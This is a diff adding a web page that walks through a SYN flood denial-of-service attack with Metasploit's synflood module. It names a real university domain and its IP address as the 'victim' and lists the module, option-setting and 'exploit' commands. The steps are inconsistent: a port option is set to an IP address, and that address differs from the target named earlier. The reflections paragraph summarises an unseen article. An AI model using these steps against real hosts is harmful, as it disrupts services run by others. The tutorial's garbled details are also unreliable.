@@ -21,7 +21,52 @@
     
         </div>
       </nav>
+      <h1 class="text-center">How to perform SYS Flood with Metasploit ?</h1>
+     
       <div class="container">
+        <p>First, select your target's IP address. I am taking emu.edu.tr as a victim. So you know how to get an IP address from a
+          domain name. Simple doping and that will give to domain IP address.
+ 
+       </p><br><br>
+       <img src="images/dos-pic1.jpeg"><br><br>
+
+       <p>So now I know the victim's IP Address 193.140.173.247. <br>
+        Launching Metasploit by typing msfconsole in your kali terminal.</p>
+        <br><br><br>
+
+        <h2>Then you carry out the following steps:</h2> <br><br>
+      <ul>
+        <li>
+          select the auxiliary "auxiliary/dos/TCP/synflood" by typing the following command. <br>
+Msf6 > use auxiliary/dos/tcp/synflood <br>
+Msf6> show options
+        </li>
+        <br><br>
+        <li>set an option just you have to typeset and the option name and option. <br>
+          You have to set two main option <br>
+          RHOST= target IP Address <br>
+          RPORT= target PORT Address <br>
+          Set RPORT 18.192.182.30 <br>
+          Set RPORT 80</li>
+          <br><br>
+          <li>
+           
+            <p>To launch the attack just type: exploit to see the packets you can open Wireshark.</p>
+            <img src="images/d0s-pic2.jpeg" alt="">
+
+          </li>
+      </ul>
+      <h2>Reflections-</h2>
+      A prevalent type of DDoS (Distributed Denial of Service) attack, SYN flood DDoS assaults are thoroughly explained in the article.
+       It starts out by presenting the idea of DDoS assaults and how they affect internet services, highlighting how disruptive they can
+        be. The discussion then moves on to the intricacies of SYN flood assaults, describing how attackers use the TCP three-way
+         handshake process's weaknesses to overwhelm their targets' servers. The first SYN request, the server's SYN-ACK response,
+          and the last ACK from the client are all covered in this section, along with the various stages of a SYN flood assault.
+       The paper also emphasizes how SYN flood assaults are amplified by the use of botnets and fake IP addresses.
+
+      
+       
+      </div>
     
 </body>
 </html>
